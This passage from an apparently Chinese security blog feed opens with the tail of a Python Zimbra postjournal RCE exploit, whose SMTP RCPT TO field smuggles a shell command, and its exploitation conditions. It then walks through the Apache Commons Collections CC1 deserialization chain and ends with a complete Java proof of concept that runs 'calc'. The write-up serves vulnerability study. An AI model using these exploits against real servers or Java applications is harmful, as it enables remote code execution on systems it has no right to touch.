FROM: &lt;aaaa@mail.domain.com&gt;\\r\\n&#39;)</span><br><span class=\"line\">            conn.recv(1024)</span><br><span class=\"line\"></span><br><span class=\"line\">            rcpt_to_payload &#x3D; f&#39;RCPT TO: &lt;&quot;exploit$(touch &#x2F;tmp&#x2F;pwn)&quot;@mail.domain.com&gt;\\r\\n&#39;.encode()</span><br><span class=\"line\">            conn.send(rcpt_to_payload)</span><br><span class=\"line\">            conn.recv(1024)</span><br><span class=\"line\"></span><br><span class=\"line\">            conn.send(b&#39;DATA\\r\\n&#39;)</span><br><span class=\"line\">            conn.recv(1024)</span><br><span class=\"line\"></span><br><span class=\"line\">            conn.send(b&#39;aaa\\r\\n.\\r\\n&#39;)</span><br><span class=\"line\">            resp &#x3D; conn.recv(1024)</span><br><span class=\"line\"></span><br><span class=\"line\">            conn.send(b&#39;QUIT\\r\\n&#39;)</span><br><span class=\"line\">            return resp.decode(&#39;utf-8&#39;)</span><br><span class=\"line\"></span><br><span class=\"line\">    except Exception as e:</span><br><span class=\"line\">        return f&quot;Error: &#123;str(e)&#125;&quot;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"漏洞利用限制\"><a href=\"#漏洞利用限制\" class=\"headerlink\" title=\"漏洞利用限制\"></a>漏洞利用限制</h1><h2 id=\"默认不开启\"><a href=\"#默认不开启\" class=\"headerlink\" title=\"默认不开启\"></a>默认不开启</h2><p>postjournal 服务默认不开启，开启命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">zmlocalconfig -e postjournal_enabled&#x3D;true</span><br><span class=\"line\">zmcontrol restart</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"本地运行\"><a href=\"#本地运行\" class=\"headerlink\" title=\"本地运行\"></a>本地运行</h2><p>Zimbra 中的一些服务是在本地地址上运行，无法通过公网直接访问，当开启该服务时，只能通过25端口进行 “转发” 到该服务，造成RCE</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Zimbra/image-20241006175634525.png\" alt=\"image-20241006175634525\"> </p>\n<h2 id=\"ip限制\"><a href=\"#ip限制\" class=\"headerlink\" title=\"ip限制\"></a>ip限制</h2><p>zimbra中 <strong>postconf</strong> 的选项 <strong>smtpd_relay_restrictions</strong>，仅允许在客户端经过身份验证或客户端在 <strong>mynetworks</strong> 列表中时发送邮件</p>\n<p>当没有经过身份验证时，mynetworks为：<strong>公网ip/20的CIDR</strong> ，还是有概率被打的 :（</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">mynetworks &#x3D; 127.0.0.0&#x2F;8 [::1]&#x2F;128 &lt;Public IP&gt;&#x2F;20 10.47.0.0&#x2F;16 10.122.0.0&#x2F;20</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://blog.projectdiscovery.io/zimbra-remote-code-execution/\">https://blog.projectdiscovery.io/zimbra-remote-code-execution/</a></p>\n<p><a href=\"https://wiki.zimbra.com/wiki/Ports\">https://wiki.zimbra.com/wiki/Ports</a></p>\n","categories":["漏洞分析"]},{"title":"CommonsCollections-1(上)","url":"/2023/12/25/CommonsCollections-1(%E4%B8%8A)/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。</p>\n<p> <a href=\"https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/\">Apache Commons Collections包和简介 | 闪烁之狐 (blinkfox.github.io)</a></p>\n<p><strong>CC1链之TransformedMap链</strong></p>\n<h1 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h1><ul>\n<li>JDK版本：jdk1.8以前（8u71之后已修复不可利用）jdk1.8.0_66</li>\n<li>CC版本：Commons-Collections 3.1-3.2.1</li>\n<li>idea</li>\n<li>maven在pom.xml添加</li>\n</ul>\n<figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">     &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class=\"line\">     &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class=\"line\">     &lt;version&gt;3.1&lt;/version&gt;</span><br><span class=\"line\">   &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n\n<p>maven下载一下源代码</p>\n<a id=\"more\"></a>\n\n<h1 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h1><h2 id=\"InvokerTransformer\"><a href=\"#InvokerTransformer\" class=\"headerlink\" title=\"InvokerTransformer\"></a>InvokerTransformer</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">transform</span><span class=\"params\">(Object input)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (input == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            Class cls = input.getClass();</span><br><span class=\"line\">            Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> method.invoke(input, iArgs);</span><br><span class=\"line\">                </span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> FunctorException(<span class=\"string\">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class=\"string\">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class=\"string\">&quot;&#x27; does not exist&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IllegalAccessException ex) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> FunctorException(<span class=\"string\">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class=\"string\">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class=\"string\">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (InvocationTargetException ex) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> FunctorException(<span class=\"string\">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class=\"string\">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class=\"string\">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里 <strong>transform</strong> 就是通过反射调用方法，<strong>参数input,iMethodName,iArgs都通过构造方法可控</strong>所以就是调用任意类的任意方法</p>\n<p>尝试命令执行</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">BasicLearn</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        Runtime runtime = Runtime.getRuntime();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>,<span class=\"keyword\">new</span> Class[]&#123;String.class&#125;,<span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;).transform(runtime);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>向上寻找谁调用了 transform</p>\n<h2 id=\"TransformedMap\"><a href=\"#TransformedMap\" class=\"headerlink\" title=\"TransformedMap\"></a>TransformedMap</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">protected</span> Object <span class=\"title\">checkSetValue</span><span class=\"params\">(Object value)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> valueTransformer.transform(value);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>调用 <strong>变量valueTransformer的transform方法</strong>，看一下构造方法是否可控这个变量</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"title\">TransformedMap</span><span class=\"params\">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(map);</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.keyTransformer = keyTransformer;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.valueTransformer = valueTransformer;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>一个<strong>protected类型</strong>的构造方法，只能自己调用，向上发现 static 的 <strong>decorate</strong> 进行调用构造方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Map <span class=\"title\">decorate</span><span class=\"params\">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>通过类名直接调用 decorate 可以完成前置设置</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Runtime runtime = Runtime.getRuntime();</span><br><span class=\"line\">InvokerTransformer invoke = <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;);</span><br><span class=\"line\">HashMap map = <span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\">map.put(<span class=\"string\">&quot;aaa&quot;</span>,<span class=\"string\">&quot;bbb&quot;</span>);</span><br><span class=\"line\">TransformedMap.decorate(map,<span class=\"keyword\">null</span>,invoke);</span><br></pre></td></tr></table></figure>\n\n<p>此时 <strong>checkSetValue的值还不确定是否可控</strong>，接着向上寻找调用，发现只有一处引用</p>\n<h2 id=\"AbstractInputCheckedMapDecorator\"><a href=\"#AbstractInputCheckedMapDecorator\" class=\"headerlink\" title=\"AbstractInputCheckedMapDecorator\"></a>AbstractInputCheckedMapDecorator</h2><p>TransformedMap的父类AbstractInputCheckedMapDecorator调用，在内部的MapEntry进行调用</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MapEntry</span> <span class=\"keyword\">extends</span> <span class=\"title\">AbstractMapEntryDecorator</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/** The parent map */</span></span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"title\">MapEntry</span><span class=\"params\">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">super</span>(entry);</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.parent = parent;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">setValue</span><span class=\"params\">(Object value)</span> </span>&#123;</span><br><span class=\"line\">            value = parent.checkSetValue(value);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> entry.setValue(value);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里理解一下Entry</p>\n<blockquote>\n<p>Java的entry是一个静态内部类，实现Map.Entry&lt; K ,V&gt; 这个接口,通过entry类可以构成一个单向链表。</p>\n<p>Map是java中的接口，Map.Entry是Map的一个内部接口。</p>\n<p>Map提供了一些常用方法，如keySet()、entrySet()等方法。</p>\n<p>keySet()方法返回值是Map中key值的集合；entrySet()的返回值也是返回一个Set集合，此集合的类型为Map.Entry。</p>\n<p>Map.Entry是Map声明的一个内部接口，此接口为泛型，定义为Entry&lt;K,V&gt;。它表示Map中的一个实体（一个key-value对）。接口中有getKey(),getValue方法。</p>\n</blockquote>\n<p>这里就是通过遍历Entry，重写了setValue方法</p>\n<p>向上寻找</p>\n<h2 id=\"AnnotationInvocationHandler\"><a href=\"#AnnotationInvocationHandler\" class=\"headerlink\" title=\"AnnotationInvocationHandler\"></a>AnnotationInvocationHandler</h2><p>发现这里的readObject中调用了setValue</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span>(var4.hasNext()) &#123;</span><br><span class=\"line\">            Entry var5 = (Entry)var4.next();</span><br><span class=\"line\">            String var6 = (String)var5.getKey();</span><br><span class=\"line\">            Class var7 = (Class)var3.get(var6);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (var7 != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                Object var8 = var5.getValue();</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class=\"keyword\">instanceof</span> ExceptionProxy)) &#123;</span><br><span class=\"line\">                    var5.setValue((<span class=\"keyword\">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class=\"string\">&quot;[&quot;</span> + var8 + <span class=\"string\">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n\n<p>但这里setValue好似不可控，后面再说，此类为default，想要序列化还需要反射</p>\n<h1 id=\"Runtime问题\"><a href=\"#Runtime问题\" class=\"headerlink\" title=\"Runtime问题\"></a>Runtime问题</h1><p>在序列化的时候会报无法序列化的错误。原因就在于<code>Runtime</code>类并没有实现<code>Serializable</code>接口，所以无法序列化</p>\n<p>利用反射即可解决</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Class c = Runtime.class;</span><br><span class=\"line\">Method getRuntimeMethod = c.getMethod(<span class=\"string\">&quot;getRuntime&quot;</span>,<span class=\"keyword\">null</span>);</span><br><span class=\"line\">Runtime r = (Runtime)getRuntimeMethod.invoke(<span class=\"keyword\">null</span>,<span class=\"keyword\">null</span>);  <span class=\"comment\">//静态方法无人调用，参数无</span></span><br><span class=\"line\">Method execMethod = c.getMethod(<span class=\"string\">&quot;exec&quot;</span>, String.class);</span><br><span class=\"line\">execMethod.invoke(r,<span class=\"string\">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"ChainedTransformer问题\"><a href=\"#ChainedTransformer问题\" class=\"headerlink\" title=\"ChainedTransformer问题\"></a>ChainedTransformer问题</h1><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ChainedTransformer</span><span class=\"params\">(Transformer[] transformers)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>();</span><br><span class=\"line\">        iTransformers = transformers;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * Transforms the input to result via each decorated transformer</span></span><br><span class=\"line\"><span class=\"comment\">     * </span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> object  the input object passed to the first transformer</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> the transformed result</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">transform</span><span class=\"params\">(Object object)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class=\"line\">            object = iTransformers[i].transform(object);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> object;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里看构造方法，<strong>传入一个数组，transform方法就是循环调用数组里面的transform方法，且参数都是上一次调用的结果，那么可以配合InvokerTransformer与Runtime的反射进行快速调用</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>,<span class=\"keyword\">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>,<span class=\"keyword\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>,<span class=\"keyword\">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class=\"keyword\">new</span> Object[]&#123;<span class=\"keyword\">null</span>,<span class=\"keyword\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>,<span class=\"keyword\">new</span> Class[]&#123;String.class&#125;,<span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        ChainedTransformer chainedTransformer = <span class=\"keyword\">new</span> ChainedTransformer(transformers);</span><br><span class=\"line\">        chainedTransformer.transform(Runtime.class);</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"readObject问题\"><a href=\"#readObject问题\" class=\"headerlink\" title=\"readObject问题\"></a>readObject问题</h1><p>先看构造方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class=\"line\">        Class[] var3 = var1.getInterfaces();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class=\"number\">1</span> &amp;&amp; var3[<span class=\"number\">0</span>] == Annotation.class) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.type = var1;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.memberValues = var2;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> AnnotationFormatError(<span class=\"string\">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">this.type &#x3D; extends Annotation 要求传入的是注释类</span><br><span class=\"line\">this.memberValues &#x3D; Map&lt;String, Object&gt; 传入的Map</span><br></pre></td></tr></table></figure>\n\n<p>再看readObject</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">readObject</span><span class=\"params\">(ObjectInputStream var1)</span> <span class=\"keyword\">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class=\"line\">        var1.defaultReadObject();</span><br><span class=\"line\">        AnnotationType var2 = <span class=\"keyword\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            var2 = AnnotationType.getInstance(<span class=\"keyword\">this</span>.type);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> InvalidObjectException(<span class=\"string\">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        Map var3 = var2.memberTypes();</span><br><span class=\"line\">        Iterator var4 = <span class=\"keyword\">this</span>.memberValues.entrySet().iterator();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span>(var4.hasNext()) &#123;</span><br><span class=\"line\">            Entry var5 = (Entry)var4.next();</span><br><span class=\"line\">            String var6 = (String)var5.getKey();</span><br><span class=\"line\">            Class var7 = (Class)var3.get(var6);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (var7 != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                Object var8 = var5.getValue();</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class=\"keyword\">instanceof</span> ExceptionProxy)) &#123;</span><br><span class=\"line\">                    var5.setValue((<span class=\"keyword\">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class=\"string\">&quot;[&quot;</span> + var8 + <span class=\"string\">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">var2 &#x3D; AnnotationType.getInstance(this.type);  &#x2F;&#x2F;获取传入的注释类</span><br><span class=\"line\">Map var3 &#x3D; var2.memberTypes();   &#x2F;&#x2F;返回Map 获取注释类 键是成员的名字，值是成员的类型</span><br><span class=\"line\"></span><br><span class=\"line\">String var6 &#x3D; (String)var5.getKey();  &#x2F;&#x2F;获取传入Map的key 即 aaa</span><br><span class=\"line\">Class var7 &#x3D; (Class)var3.get(var6);  &#x2F;&#x2F;从注释类成员中找与Map中相同的变量 如果传入Override(空成员变量) 则无法进入if</span><br></pre></td></tr></table></figure>\n\n<p>那么这里传入<strong>Retention.class 或者 Target.class</strong> 并且把 <strong>map中的key换为value</strong> 即</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Object o = cons.newInstance(Retention.class, transformMap);</span><br><span class=\"line\">map.put(<span class=\"string\">&quot;value&quot;</span>, <span class=\"string\">&quot;bbb&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>if顺利进入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + ...));</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"poc\"><a href=\"#poc\" class=\"headerlink\" title=\"poc\"></a>poc</h1><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.Retention;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Constructor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CC1</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        ChainedTransformer chainedTransformer = <span class=\"keyword\">new</span> ChainedTransformer(transformers);</span><br><span class=\"line\">        <span class=\"comment\">//chainedTransformer.transform(Runtime.class);</span></span><br><span class=\"line\"></span><br><span class=\"line\">        HashMap&lt;Object, Object&gt; map = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        map.put(<span class=\"string\">&quot;value&quot;</span>, <span class=\"string\">&quot;bbb&quot;</span>);</span><br><span class=\"line\">        Map&lt;Object, Object&gt; transformMap = TransformedMap.decorate(map, <span class=\"keyword\">null</span>, chainedTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        Class c = Class.forName(<span class=\"string\">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class=\"line\">        Constructor cons = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class=\"line\">        cons.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        Object o = cons.newInstance(Retention.class, transformMap);</span><br><span class=\"line\">        serialize(o);</span><br><span class=\"line\">        unserialize(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">        FileOutputStream fos = <span class=\"keyword\">new</span> FileOutputStream(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\">        ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(fos);</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">        oos.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Object <span class=\"title\">unserialize</span><span class=\"params\">(String Filname)</span> <span class=\"keyword\">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class=\"line\">        FileInputStream fis = <span class=\"keyword\">new</span> FileInputStream(Filname);</span><br><span class=\"line\">        ObjectInputStream ois = <span class=\"keyword\">new</span> ObjectInputStream(fis);</span><br><span class=\"line\">        Object obj = ois.readObject();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"调试跟进\"><a href=\"#调试跟进\" class=\"headerlink\" title=\"调试跟进\"></a>调试跟进</h1><p>理清流程，调试跟进</p>\n<p>readObject</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/577188c4f56844e9be5d994f08976ae8.png\"></p>\n<p>setValue这里的 value 不影响，这里 parent 为TransformMap</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/b5c21fdd961b4101b5ccf7cefa6f8fd3.png\"></p>\n<p>到 checkSetValue 时，已经通过构造方法使 <strong>valueTransformer 为 chainedTransformer</strong></p>\n<p><img 